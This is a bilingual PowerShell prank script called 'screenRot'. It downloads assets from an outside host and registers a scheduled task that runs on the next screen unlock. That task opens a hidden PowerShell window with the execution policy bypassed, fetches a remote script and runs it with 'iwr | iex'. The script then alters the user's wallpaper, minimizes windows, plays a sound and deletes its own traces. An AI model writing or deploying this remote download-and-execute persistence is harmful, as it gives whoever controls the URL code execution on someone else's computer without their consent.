# Directory and file names
# Nombres de archivos y carpetas
$folderPath = Join-Path ([Environment]::GetFolderPath('MyDocuments')) 'screenRot'
$audioFilename = 'sound.wav'
$overlayFilename = 'img.png'
$outputFilename = 'wallpaper.bmp'
$overlayPath = Join-Path $folderPath $overlayFilename
$outputPath = Join-Path $folderPath $outputFilename
$audioPath = Join-Path $folderPath $audioFilename

# Assets URLs
# Direcciones de los archivos
$urlScript = 'https://rot.intorandom.com/run/run.ps1'
$urlImage = 'https://rot.intorandom.com/run/img.png'
$urlAudio = 'https://rot.intorandom.com/run/sound.wav'

# Windows task name
# Nombre de la tarea de Windows
$taskName = 'screenRot'

# Function to check if assets exist in user's computer
# Función para verificar la existencia de los archivos en el computador del usuario
function CheckAssets {
    if (-not (Test-Path $overlayPath) -or (Get-Item $overlayPath).Length -eq 0) {
        return $false
    }
    if (-not (Test-Path $audioPath) -or (Get-Item $audioPath).Length -eq 0) {
        return $false
    }
    return $true
}

# Function to download assets in user's computer
# Función para descargar los archivos en la computadora del usuario
function DownloadAssets {
    try {
        if (-not (Test-Path $folderPath)) {
            New-Item -ItemType Directory -Path $folderPath | Out-Null
        }
        Invoke-WebRequest -Uri $urlImage -OutFile $overlayPath -ErrorAction Stop
        Invoke-WebRequest -Uri $urlAudio -OutFile $audioPath -ErrorAction Stop

        if ((Get-Item $overlayPath).Length -lt 100 -or (Get-Item $audioPath).Length -lt 100) {
            Write-Error 'Downloaded files appear corrupted'
            exit
        }

        Write-Host 'Assets downloaded in: ' $folderPath
    }
    catch {
        Write-Error 'Error downloading assets: $_'
        exit
    }
}

# Function to create rot wallpaper
# Función para crear el fondo de pantalla con falla
function GenerateWallpaper {
    $background = $null
    $overlay = $null
    $resizedOverlay = $null
    $result = $null
    $graphics = $null
    $gOverlay = $null
    
    try {
        Add-Type -AssemblyName System.Drawing

        $currentWallpaper = Get-ItemPropertyValue 'HKCU:\Control Panel\Desktop' -Name WallPaper
        
        # Validar wallpaper existe y no es vacío
        if ([string]::IsNullOrWhiteSpace($currentWallpaper) -or -not (Test-Path $currentWallpaper)) {
            Write-Error "No valid wallpaper found. User may have solid color background."
            exit
        }

        $background = [System.Drawing.Image]::FromFile($currentWallpaper)
        $overlay = [System.Drawing.Image]::FromFile($overlayPath)

        $bgWidth = $background.Width
        $bgHeight = $background.Height

        $scale = [Math]::Min($bgWidth / $overlay.Width, $bgHeight / $overlay.Height)
        $newWidth = [int]($overlay.Width * $scale)
        $newHeight = [int]($overlay.Height * $scale)

        $resizedOverlay = New-Object System.Drawing.Bitmap $newWidth, $newHeight
        $gOverlay = [System.Drawing.Graphics]::FromImage($resizedOverlay)
        $gOverlay.DrawImage($overlay, 0, 0, $newWidth, $newHeight)
        $gOverlay.Dispose()
        $gOverlay = $null
        
        $overlay.Dispose()
        $overlay = $null

        $result = New-Object System.Drawing.Bitmap $bgWidth, $bgHeight
        $graphics = [System.Drawing.Graphics]::FromImage($result)
        $graphics.DrawImage($background, 0, 0, $bgWidth, $bgHeight)

        $background.Dispose()
        $background = $null

        $x = $bgWidth - $newWidth
        $y = 0
        $graphics.DrawImage($resizedOverlay, $x, $y)
        
        $resizedOverlay.Dispose()
        $resizedOverlay = $null
        $graphics.Dispose()
        $graphics = $null

        $result.Save($outputPath, [System.Drawing.Imaging.ImageFormat]::Bmp)
        $result.Dispose()
        $result = $null

    }
    catch {
        Write-Error "Error creating rot wallpaper: $_"
        
        if ($gOverlay) { $gOverlay.Dispose() }
        if ($graphics) { $graphics.Dispose() }
        if ($background) { $background.Dispose() }
        if ($overlay) { $overlay.Dispose() }
        if ($resizedOverlay) { $resizedOverlay.Dispose() }
        if ($result) { $result.Dispose() }
        
        exit
    }
}

# Function to set rot wallpaper
# Función para aplicar el fondo de pantalla con falla
function SetWallpaper {
    $code = @"
using System;
using System.Runtime.InteropServices;

public class Wallpaper {
    [DllImport("user32.dll", SetLastError = true)]
    public static extern bool SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
}
"@

    Add-Type $code

    $SPI_SETDESKWALLPAPER = 0x0014
    $SPIF_UPDATEINIFILE = 0x01
    $SPIF_SENDCHANGE = 0x02

    [Wallpaper]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $outputPath, $SPIF_UPDATEINIFILE -bor $SPIF_SENDCHANGE) | Out-Null
}

# Function to play sound
# Función para reproducir el sonido
function PlaySound {
    $player = New-Object System.Media.SoundPlayer $audioPath
    $player.Play()
}

# Function to register new task, it will run in next logon
# Función para registrar la tarea, esta se activara en el proximo inicio de sesión
function RegisterTask {
    try {
        $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
        if ($existingTask) {
            Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
        }

        $action = New-ScheduledTaskAction -Execute "powershell.exe" `
            -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"try { `$url='$urlScript'; iwr `$url -UseBasicParsing | iex } catch { Write-Error $_ }`"" -WorkingDirectory "$env:USERPROFILE"

        $class = Get-CimClass -ClassName MSFT_TaskSessionStateChangeTrigger -Namespace Root/Microsoft/Windows/TaskScheduler
        $trigger = New-CimInstance -CimClass $class -ClientOnly
        $trigger.StateChange = 8  # 8 = Session Unlock (desbloqueo)
        $trigger.UserId = "$env:USERDOMAIN\$env:USERNAME"

        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable

        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -RunLevel Limited

        Write-Host 'Ready, this will run on next screen unlock' 
        Write-Host 'Please close this window' 
    }
    catch {
        Write-Error "Error task not registered: $_"
        exit
    }
}


# Script execution structure
# Estructura de ejecución del script
if (-not (CheckAssets)) {
    DownloadAssets
    RegisterTask
}
else {
    GenerateWallpaper
    Start-Sleep -Seconds 5

    $shell = New-Object -ComObject "Shell.Application"
    $shell.minimizeall()
    PlaySound
    Start-Sleep -Seconds 3
    
    SetWallpaper
    
    $existingTask = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if ($existingTask) {
        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
    }
    
    Remove-Item -Path $folderPath -Recurse -Force
}

exit
